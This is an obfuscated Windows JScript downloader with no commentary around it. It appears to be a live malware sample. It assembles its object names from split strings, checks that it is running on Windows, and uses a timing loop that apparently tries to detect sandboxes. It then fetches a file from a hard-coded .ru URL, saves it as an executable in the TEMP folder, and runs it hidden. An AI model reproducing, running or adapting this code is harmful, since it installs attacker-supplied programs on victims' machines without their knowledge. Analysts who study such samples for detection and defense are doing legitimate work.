var CA = false;
var XN = "Create"+"Object";
var U0 = function N0() {return WScript[XN]("WScript"+".Shell");}(), K0 = 11;
var L0 = "MSXML2"+".XMLHTTP";
var MX = 2;
var V = MX - 2;
function CG(YS){U0["Run"](YS, V, V);};
function L(){return L0 + "";};
function N1(QG, TV){V = V * 1; return QG - TV;};
function I(){return XN;};
/*@cc_on
  @if (@_win32 || @_win64)
    CA = true;
  @end
@*/
if (CA)
{
var QU = "";
function Y(){return 22;};
var S1 = 0; var KZ = 0;
function BL()
{
var ZW = new this["Date"]();
var UR = ZW["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var ZW = new this["Date"]();
var S0 = ZW["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var ZW = new this["Date"]();
var C = ZW["getUTCMilliseconds"]();
var S1 = "B";
S1 = N1(S0, UR);
var KZ = "ZH";
KZ = N1(C, S0);
QU = "open";
return N1(S1, KZ);
}
var QC = false;
var U = false;
for (var B0 = V; B0 < Y() * 1; B0++){if (BL() != V){
QC = true; 
KZ = "31" + 11 * S1 + KZ; 
U = true; 
break;
}}
function S() {return ((QC == true) && (QC == U)) ? 1 : V;};
if (QC && S() && U){
function NQ() {return U0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HKNzkQCpB7A.ex" + "e";};
 B1 = L();
 CM = WScript[XN](B1);
 var N2 = 1;
do { 
	for (;N2;){
	try {
		if (N2 == 1)
		{
			CM[QU]("GET", "http://jafes.ru/b0ros", false);
			CM["send"]();
			EJ = "Sleep";
			N2 = 2;
		}
		WScript[EJ](Y() + 120); 
		if (CM["readystate"] < 2 * 2) continue;
		N2 = V;
		function N(GC) {var K = (1, 2, 3, 4, 5, GC); return K;};
		E = WScript[I()]("ADODB.Stream");
		B1 = E;
		B1[QU]();
		B1["type"] = N(1);
		B1["write"](CM["ResponseBody"]);
		E["position"] = N(V);
		B1["Save" + "ToFile"](NQ(), 2);
		E["cl"+"ose"]();
		RG = NQ();
		CG(RG);
	} catch(K1){};};
}while (N2);
}
}

